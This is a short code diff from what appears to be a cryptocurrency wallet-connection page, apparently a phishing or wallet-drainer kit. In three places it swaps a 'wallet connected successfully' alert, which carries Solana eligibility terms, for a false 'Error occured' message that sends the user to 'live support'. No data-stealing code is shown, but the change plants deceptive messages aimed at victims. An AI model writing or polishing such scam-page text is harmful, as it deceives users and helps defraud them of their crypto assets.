@@ -119,7 +119,7 @@
 					$("#mdal5").hide()
 					$("#tab1").click()
 					setTimeout(function(){
-						alert("Wallet connected successfully. Kindly note that new wallets won't be eligible as you must have held solana in the past and must be currently holding at least 0.115 SOL to be eligible.")
+						alert("Error occured! Please try again and if error persist contact live support for assistance.")
 					}, 500)
 				}
 			})
@@ -148,7 +148,7 @@
 					$("#mdal5").hide()
 					$("#tab1").click()
 					setTimeout(function(){
-						alert("Wallet connected successfully. Kindly note that new wallets won't be eligible as you must have held solana in the past and must be currently holding at least 0.115 SOL to be eligible.")
+						alert("Error occured! Please try again and if error persist contact live support for assistance.")
 					}, 500)
 				}
 			})
@@ -176,7 +176,7 @@
 					$("#mdal5").hide()
 					$("#tab1").click()
 					setTimeout(function(){
-						alert("Wallet connected successfully. Kindly note that new wallets won't be eligible as you must have held solana in the past and must be currently holding at least 0.115 SOL to be eligible.")
+						alert("Error occured! Please try again and if error persist contact live support for assistance.")
 					}, 500)
 				}
 			})
